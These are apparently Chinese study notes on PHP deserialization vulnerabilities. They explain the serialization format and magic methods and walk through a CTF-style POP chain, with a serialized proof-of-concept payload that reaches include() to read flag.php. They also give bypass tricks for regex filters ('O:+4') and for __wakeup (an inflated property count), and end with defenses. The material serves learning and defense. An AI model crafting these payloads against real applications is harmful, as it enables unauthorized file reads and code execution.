# PHP反序列化漏洞 学习笔记

## 一、PHP面向对象基础知识

### 1.2 类的基本结构

```php
class demo {
    // 成员变量（属性）
    var $name = "juran";
    var $sex;
    
    // 成员函数（方法）
    function jr() {
        echo $this->name;
    }
}

// 实例化对象
$d = new demo();
$d->jr();
```

### 1.3 访问修饰符

| 修饰符      | 说明     | 类内部 | 子类 | 外部 |
| ----------- | -------- | ------ | ---- | ---- |
| `public`    | 共有的   | ✅      | ✅    | ✅    |
| `protected` | 受保护的 | ✅      | ✅    | ❌    |
| `private`   | 私有的   | ✅      | ❌    | ❌    |

```php
class demo {
    public $name = "juran";      // 外部可访问
    protected $sex = "猛男";      // 外部不可访问
    private $age = 18;           // 外部不可访问
}
```

---

## 二、序列化基础知识

### 2.1 序列化的作用

将对象的状态信息转换为**可以存储或传输**的形式的过程。

### 2.2 序列化后的格式

| 类型   | 格式示例                                 |
| ------ | ---------------------------------------- |
| 空字符 | `N;`                                     |
| 整型   | `i:123;`                                 |
| 浮点型 | `d:123.3;`                               |
| 布尔型 | `b:1;`                                   |
| 字符串 | `s:5:"juran";`                           |
| 数组   | `a:3:{i:0;s:5:"juran";i:1;s:2:"jr";}`    |
| 对象   | `O:4:"demo":1:{s:4:"name";s:5:"juran";}` |

### 2.3 序列化对象详解

```php
class demo {
    public $name = "juran";
    protected $age;
    private $sex;
}

// 序列化结果
// O:4:"demo":3:{s:4:"name";s:5:"juran";s:6:"%00*%00age";N;s:9:"%00demo%00sex";N;}
```

**格式解析**：
- `O:4:"demo":3` → 对象，类名长度4，类名demo，3个属性
- `s:4:"name"` → 属性名，字符串类型
- `%00*%00age` → protected属性，格式：`%00*%00属性名`
- `%00demo%00sex` → private属性，格式：`%00类名%00属性名`

---

## 三、反序列化

### 3.1 核心函数

| 函数            | 作用               |
| --------------- | ------------------ |
| `serialize()`   | 将对象转化为字符串 |
| `unserialize()` | 将字符串转换为对象 |

### 3.2 反序列化特点

> **关键点**：反序列化生成的对象的**成员属性值**由被反序列化的字符串决定，与原来类预定义的值**无关**。

```php
// 原类定义
class demo {
    public $name = "juran";
}

// 反序列化时可以修改属性值
$d = unserialize('O:4:"demo":1:{s:4:"name";s:2:"jr";}');
// 此时 $d->name = "jr"，而非 "juran"
```

### 3.3 反序列化漏洞原因

> **核心原因**：`unserialize()` 接收的值**可控**（用户输入）

```php
$get = $_GET["s"];
$b = unserialize($get);  // 危险：用户可控输入直接反序列化
```

---

## 四、魔法方法（Magic Methods）

### 4.1 什么是魔法方法

- 预定好的、在**特定情况下自动触发**的行为方法
- 命名以双下划线 `__` 开头

### 4.2 常用魔法方法

| 魔法方法         | 触发时机                                 |
| ---------------- | ---------------------------------------- |
| `__construct()`  | 创建对象时触发                           |
| `__destruct()`   | 对象被销毁时触发                         |
| `__call()`       | 调用不存在或不可访问的方法时             |
| `__callStatic()` | 静态上下文中调用不可访问的方法时         |
| `__get()`        | 读取不存在或不可访问的属性时             |
| `__set()`        | 给不存在或不可访问的属性赋值时           |
| `__isset()`      | 对不可访问属性调用`isset()`或`empty()`时 |
| `__unset()`      | 在不可访问的属性上使用`unset()`时        |
| `__invoke()`     | 把对象当成函数调用时                     |
| `__sleep()`      | 执行`serialize()`时先调用                |
| `__wakeup()`     | 执行`unserialize()`时先调用              |
| `__toString()`   | 把对象当成字符串调用时                   |
| `__clone()`      | 使用`clone`关键字拷贝对象后触发          |

### 4.3 示例代码

```php
class demo {
    public function __construct() {
        echo "已创建";
    }
    public function __destruct() {
        echo "已销毁";
    }
    public function __sleep() {
        echo "使用了serialize";
        return array('name');
    }
    public function __wakeup() {
        echo "使用了unserialize";
    }
    public function __toString() {
        return "字符串";
    }
    public function __invoke() {
        echo "函数";
    }
}
```

---

## 五、POP链构造思路

### 5.1 什么是POP链

**POP（Property-Oriented Programming）** 属性面向编程，利用魔法方法之间的调用关系，构造一条从入口到危险函数的执行链。

### 5.2 核心思想

> 魔法方法触发的前提是：魔法方法所在的类或者对象被调用

利用各个类的魔法方法作为“跳板”，串联成一条调用链，最终触发恶意代码执行。

### 5.3 POP链构造步骤

1. **寻找入口**：找到反序列化时会触发的魔法方法（如`__wakeup`、`__destruct`）
2. **分析调用链**：分析魔法方法中调用了哪些类/属性/方法
3. **寻找跳板**：找到其他类的魔法方法作为中间节点
4. **最终执行**：找到能够执行危险操作（如`eval`、`include`、`system`）的方法

### 5.4 实战案例解析

```php
class Modifier {
    private $var;
    public function append($value) {
        include($value);  // 危险函数
    }
    public function __invoke() {
        $this->append($this->var);
    }
}

class Show {
    public $source;
    public $str;
    public function __toString() {
        return $this->str->source;  // 触发__get
    }
    public function __wakeup() {
        echo $this->source;  // 触发__toString
    }
}

class Test {
    public $p;
    public function __get($key) {
        $function = $this->p;
        return $function();  // 触发__invoke
    }
}
```

**POP链流程**：
```
unserialize 
    → Show::__wakeup 
    → echo $this->source 
    → Show::__toString 
    → $this->str->source（Test类中没有source属性）
    → Test::__get 
    → $function()（$this->p = Modifier对象）
    → Modifier::__invoke 
    → Modifier::append 
    → include($var)  // 文件包含，获取flag
```

**最终POC**：
```php
$mod = new Modifier();
$show = new Show();
$test = new Test();
$test->p = $mod;
$show->source = $show;
$show->str = $test;

echo serialize($show);
// O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:13:"%00Modifier%00var";s:8:"flag.php";}}}
```

---

## 六、绕过方法

### 6.1 正则匹配绕过

```php
// 常见防护：禁止序列化字符串以 O:数字 开头
if (preg_match('/[oc]:\d+:/i', $var)) {
    die('stop hacking!');
}
```

**绕过技巧**：
- 使用 `O:+4` 替代 `O:4`（加号绕过正则）
- 使用 `C:4:"demo"`（C表示自定义序列化）

### 6.2 `__wakeup()` 绕过

**漏洞版本**：PHP 5.6.25 及之前，PHP 7.0.10 及之前

**绕过方法**：修改序列化字符串中的属性个数

```php
// 原序列化
O:4:"demo":1:{s:4:"name";s:5:"juran";}

// 绕过（将属性个数改为大于实际值）
O:4:"demo":2:{s:4:"name";s:5:"juran";}
```

此时`__wakeup()`不会被调用。

### 6.3 属性个数绕过示例

```php
class Demo {
    private $file = 'index.php';
    
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php';  // 试图修改
        }
    }
}

// 绕过 __wakeup，让 $file 保持为 'flag.php'
// O:4:"Demo":2:{s:10:"%00Demo%00file";s:8:"flag.php";}
```

---

## 七、总结

| 要点     | 说明                               |
| -------- | ---------------------------------- |
| 漏洞根源 | `unserialize()` 接收用户可控的输入 |
| 关键利用 | 魔法方法在特定条件下自动触发       |
| POP链    | 串联多个魔法方法，形成调用链       |
| 最终效果 | 任意文件读取、命令执行、代码执行   |

**防御措施**：
- 不要反序列化不可信的数据
- 使用白名单限制可反序列化的类
- 及时更新PHP版本（修复`__wakeup`等绕过漏洞）
- 使用`allowed_classes`选项限制类（PHP 7.0+）